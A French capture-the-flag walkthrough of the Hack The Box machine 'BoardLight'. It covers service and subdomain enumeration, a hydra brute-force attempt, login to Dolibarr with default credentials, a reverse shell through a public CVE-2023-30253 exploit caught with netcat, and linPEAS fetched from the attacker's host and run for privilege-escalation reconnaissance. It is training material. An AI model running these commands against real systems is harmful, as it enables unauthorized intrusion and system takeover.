Tout d'abord on commence par un scan.
```bash
nmap -sV -v 10.129.52.52
```

On voit qu'il y a deux ports d'ouverts:
```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41
Service Info: Host: board.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

La version d'Apache ne semble pas avoir de vulnérabilités connues.
Puisqu'il y a un serveur Apache, on scanne également les répertoires:
```bash
dirb http://10.129.52.52/
```
La page `/server-status` semble intéressant, mais nous n'y avons pas accès.
En accédant à http://10.129.52.52/, on se rend compte qu'il s'agit d'un site php.
Plusieurs liens (comme le login) ne semblent pas fonctionner.

Aucune requête POST n'apparaît dans sur le réseau lors de l'envoi d'un formulaire.
En regardant plus loin, voici un example de form:
```html
<form action="">
....
</form>
```
On constate que le champ `action` est vide.

Si on tente d'accéder à une page qui n'existe pas, par exemple `/login.php`, on obtient `File not found.`
On tente donc de faire du directory traversal pour afficher `/etc/passwd` mais sans succès, l'url est corrigée et on obtient `The requested URL was not found on this server.`.

Aucun cookie n'est visible.
La version de jQuery, `3.4.1` ne semble pas avoir de faille connues.

En cherchant .php dans le code source de la page un fichier `portfolio.php` qui est commenté.
Malheureusement accéder au fichier donne un `File not found.`

On continue l'énumération avec nikto mais rien de bien intéressant.
```bash
nikto -h http://10.129.52.52/

+ Server: Apache/2.4.41 (Ubuntu)
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Apache/2.4.41 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
+ /: Web Server returns a valid response with junk HTTP methods which may cause false positives.
+ 8074 requests: 0 error(s) and 4 item(s) reported on remote host
```

En désespoir de cause, on tente l'énumération des sous-domaines avec gobuster.
D'abord, il faut télécharger les listes de sous-domaines:
```bash
wget -c https://github.com/danielmiessler/SecLists/archive/master.zip -O SecList.zip \
  && unzip SecList.zip \
  && rm -f SecList.zip
```

Puis, on lance l'énumération avec ffuf:
```bash
ffuf -w ./SecLists-master/Discovery/DNS/subdomains-top1million-110000.txt -u http://board.htb -H "Host: FUZZ.board.htb" -mc 200 -fs 15949 -o ffuf_output.json -of json
```
On obtient le résultat suivant:

```json
{
  "commandline": "ffuf -w ./SecLists-master/Discovery/DNS/subdomains-top1million-110000.txt -u http://board.htb -H Host: FUZZ.board.htb -mc 200 -fs 15949 -o ffuf_output.txt -of json",
  "time": "2024-07-26T17:05:30-05:00",
  "results": [
    {
      "input": {
        "FFUFHASH": "6790a48",
        "FUZZ": "crm"
      },
      "position": 72,
      "status": 200,
      "length": 6360,
      "words": 397,
      "lines": 150,
      "content-type": "text/html; charset=UTF-8",
      "redirectlocation": "",
      "scraper": {},
      "duration": 93789337,
      "resultfile": "",
      "url": "http://board.htb",
      "host": "crm.board.htb"
    }
  ],
  ....
}
```

On a donc trouvé l'hôte `crm.board.htb`.
Lorsqu'on accède à la page, on voit qu'il s'agit d'une page de login pour le CRM `Dolibarr 17.0.0`
En regardant sur `exploit-db.com` on trouve que la version `17.0.1` est vulnérable à une attaque XSS. Peut-être utile pour plus tard.

Avec ces informations en tête, on va tenter une attaque sur le login avec hydra.
Pour procéder, on va avoir besoin d'un example de requête de login. Nous allons donc l'intercepter avec burp.
```bash
token=f2d2a913edc0137d1066cb9907b3f382&actionlogin=login&loginfunction=loginfunction&backtopage=&tz=-6&tz_string=America%2FChicago&dst_observed=1&dst_first=2024-03-10T01%3A59%3A00Z&dst_second=2024-11-3T01%3A59%3A00Z&screenwidth=2048&screenheight=861&dol_hide_topmenu=&dol_hide_leftmenu=&dol_optimize_smallscreen=&dol_no_mouse_hover=&dol_use_jmobile=&username=admin&password=test
```
On reçoit comme réponse `Bad value for login or password`.

Une fois ces informations en main, on lance hydra:
```bash
sudo hydra -v -V -d -l admin -P /usr/share/wordlists/seclists/Passwords/Leaked-Databases/rockyou.txt -t 16 -o hydra_results.txt http-post-form://crm.board.htb/index.php?mainmenu=home:"token=f2d2a913edc0137d1066cb9907b3f382&actionlogin=login&loginfunction=loginfunction&backtopage=&tz=-6&tz_string=America%2FChicago&dst_observed=1&dst_first=2024-03-10T01%3A59%3A00Z&dst_second=2024-11-03T01%3A59%3A00Z&screenwidth=2048&screenheight=861&dol_hide_topmenu=&dol_hide_leftmenu=&dol_optimize_smallscreen=&dol_no_mouse_hover=&dol_use_jmobile=&username=^USER^&password=^PASS^:F=Bad"
```
Mais on se rend vite compte qu'un cookie unique est généré comme protection contre le brute-force pour chaque session car on obtient la réponse: `Security token has expired, so action has been canceled. Please try again.`

On va aussi scanner les répertoires du nouveau sous-domaine avec dirb:
```bash
dirb http://crm.board.htb/
```

On va trouver quelques fichiers intéressants, notamment:

http://crm.board.htb/conf
```html
Forbidden

You don't have permission to access this resource.
```

http://crm.board.htb/api/index.php
```bash
Module Api must be enabled.

To activate modules, go on setup Area (Home->Setup->Modules).
```

http://crm.board.htb/install/phpinfo.php
```bash
The application tried to self-upgrade, but the install/upgrade pages have been disabled for security (by the existence of a lock file install.lock in the dolibarr documents directory).
If an upgrade is in progress, please wait. If not, click on the following link. If you always see this same page, you must remove/rename the file install.lock in the documents directory.
Click here to go to your application
```

Et la page dans le répertoire `public` nous redirige vers une page d'erreur 404 et les autres pages demandent un login.

En fouillant un peu sur le web, on trouve le CVE suivant pour obtenir un reverse shell, mais il nécessite d'avoir les credentials:
```bash
https://github.com/nikn0laty/Exploit-for-Dolibarr-17.0.0-CVE-2023-30253
https://github.com/dollarboysushil/Dolibarr-17.0.0-Exploit-CVE-2023-30253
```
À court d'idée, on tente de se logger avec des credentials par défaut qui sont populaire. On fini par trouver `admin`  `admin` comme login.

Maintenant qu'on a les credentials, ont peut exécuter le CVE pour obtenir un reverse shell.
Pour se faire, on démarre d'abord netcat:
```bash
nc -lvnp 9001
```

Puis, on lance le script:
```bash
python3 exploit.py http://crm.board.htb/ admin admin 10.10.14.252 9001
```

Une connexion est établie avec netcat:
```bash
listening on [any] 9001 ...
connect to [10.10.14.252] from (UNKNOWN) [10.129.52.52] 43820
bash: cannot set terminal process group (875): Inappropriate ioctl for device
bash: no job control in this shell
www-data@boardlight:~/html/crm.board.htb/htdocs/public/website$ 
```

On fait un peu de reconnaissance:
```bash
www-data@boardlight:~/html/crm.board.htb/htdocs/public/website$ whoami
whoami
www-data
www-data@boardlight:~/html/crm.board.htb/htdocs/public/website$ ls
ls
index.php
styles.css.php
www-data@boardlight:~/html/crm.board.htb/htdocs/public/website$ cd ..
cd ..
www-data@boardlight:~/html/crm.board.htb/htdocs/public$ cd /home
cd /home
www-data@boardlight:/home$ ls
ls
larissa
www-data@boardlight:/home$ ls -la
ls -la
total 12
drwxr-xr-x  3 root    root    4096 May 17 01:04 .
drwxr-xr-x 19 root    root    4096 May 17 01:04 ..
drwxr-x--- 15 larissa larissa 4096 May 17 01:04 larissa
```
Il faut donc probablement trouver un moyen de devenir `larissa`.

On va utiliser linPEAS pour trouver des vulnérabilités pour l'escalation de privilège. Pour le transférer sur la machine, on va télécharger le script sur notre machine et le servir:

wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh
sudo python3 -m http.server 8080

Par la suite, depuis le serveur, on va télécharger linPEAS.sh:

cd /tmp
wget 10.10.14.252:8080/linpeas.sh
chmod +x linpeas.sh

Puis, on va l'exécuter:
```bash
./linpeas.sh
....
╔══════════╣ Searching mysql credentials and exec
From '/etc/mysql/mysql.conf.d/mysqld.cnf' Mysql user: user		= mysql
Found readable /etc/mysql/my.cnf
!includedir /etc/mysql/conf.d/
!includedir /etc/mysql/mysql.conf.d/

╔══════════╣ Analyzing MariaDB Files (limit 70)

-rw------- 1 root root 317 May 13 23:40 /etc/mysql/debian.cnf

╔══════════╣ Analyzing Github Files (limit 70)
drwxr-xr-x 4 www-data www-data 4096 Mar  4  2023 /var/www/html/crm.board.htb/.github

══╣ PHP exec extensions
drwxr-xr-x 2 root root 4096 Mar 19 07:35 /etc/apache2/sites-enabled
drwxr-xr-x 2 root root 4096 Mar 19 07:35 /etc/apache2/sites-enabled
lrwxrwxrwx 1 root root 27 Sep 17  2023 /etc/apache2/sites-enabled/php.conf -> ../sites-available/php.conf
lrwxrwxrwx 1 root root 28 Sep 17  2023 /etc/apache2/sites-enabled/site.conf -> ../sites-available/site.conf
lrwxrwxrwx 1 root root 32 Mar 19 07:35 /etc/apache2/sites-enabled/dolibarr.conf -> ../sites-available/dolibarr.conf
lrwxrwxrwx 1 root root 29 Mar 19 00:29 /etc/apache2/sites-enabled/board.conf -> ../sites-available/board.conf

╔══════════╣ SUID - Check easy privesc, exploits and write perms
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid
-rwsr-xr-x 1 root root 15K Jul  8  2019 /usr/lib/eject/dmcrypt-get-device
-rwsr-sr-x 1 root root 15K Apr  8 18:36 /usr/lib/xorg/Xorg.wrap
-rwsr-xr-x 1 root root 27K Jan 29  2020 /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_sys (Unknown SUID binary!)
-rwsr-xr-x 1 root root 15K Jan 29  2020 /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_ckpasswd (Unknown SUID binary!)
-rwsr-xr-x 1 root root 15K Jan 29  2020 /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_backlight (Unknown SUID binary!)
-rwsr-xr-x 1 root root 15K Jan 29  2020 /usr/lib/x86_64-linux-gnu/enlightenment/modules/cpufreq/linux-gnu-x86_64-0.23.1/freqset (Unknown SUID binary!)
-rwsr-xr-- 1 root messagebus 51K Oct 25  2022 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 467K Jan  2  2024 /usr/lib/openssh/ssh-keysign
-rwsr-xr-- 1 root dip 386K Jul 23  2020 /usr/sbin/pppd  --->  Apple_Mac_OSX_10.4.8(05-2007)
-rwsr-xr-x 1 root root 44K Feb  6 04:49 /usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-xr-x 1 root root 55K Apr  9 08:34 /usr/bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
-rwsr-xr-x 1 root root 163K Apr  4  2023 /usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable
-rwsr-xr-x 1 root root 67K Apr  9 08:34 /usr/bin/su
-rwsr-xr-x 1 root root 84K Feb  6 04:49 /usr/bin/chfn  --->  SuSE_9.3/10
-rwsr-xr-x 1 root root 39K Apr  9 08:34 /usr/bin/umount  --->  BSD/Linux(08-1996)
-rwsr-xr-x 1 root root 87K Feb  6 04:49 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 67K Feb  6 04:49 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
-rwsr-xr-x 1 root root 39K Mar  7  2020 /usr/bin/fusermount
-rwsr-xr-x 1 root root 52K Feb  6 04:49 /usr/bin/chsh
-rwsr-xr-x 1 root root 15K Oct 27  2023 /usr/bin/vmware-user-suid-wrapper

╔══════════╣ SGID
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid
-rwsr-sr-x 1 root root 15K Apr  8 18:36 /usr/lib/xorg/Xorg.wrap
-rwxr-sr-x 1 root mail 23K Apr  7  2021 /usr/libexec/camel-lock-helper-1.2
-rwxr-sr-x 1 root shadow 43K Jan 10  2024 /usr/sbin/pam_extrausers_chkpwd
-rwxr-sr-x 1 root shadow 43K Jan 10  2024 /usr/sbin/unix_chkpwd
-rwxr-sr-x 1 root mail 15K Aug 26  2019 /usr/bin/mlock
-rwxr-sr-x 1 root crontab 43K Feb 13  2020 /usr/bin/crontab
-rwxr-sr-x 1 root shadow 31K Feb  6 04:49 /usr/bin/expiry
-rwxr-sr-x 1 root shadow 83K Feb  6 04:49 /usr/bin/chage
-rwxr-sr-x 1 root ssh 343K Jan  2  2024 /usr/bin/ssh-agent
-rwxr-sr-x 1 root tty 15K Mar 30  2020 /usr/bin/bsd-write

╔══════════╣ Analyzing SSH Files (limit 70)
-rw-r--r-- 1 root root 177 May  2 05:43 /etc/ssh/ssh_host_ecdsa_key.pub
-rw-r--r-- 1 root root 97 May  2 05:43 /etc/ssh/ssh_host_ed25519_key.pub
-rw-r--r-- 1 root root 569 May  2 05:43 /etc/ssh/ssh_host_rsa_key.pub

Port 22
ListenAddress 0.0.0.0
PermitRootLogin yes
PubkeyAuthentication yes
PasswordAuthentication yes
ChallengeResponseAuthentication no
UsePAM yes

```
Rien d'intéressant au niveau des cronjobs.
Il y a une base de données MySQL.
Root peut se connecter via SSH.
Il semble y avoir un fichier .github, on peut peut-être explorer les commits.

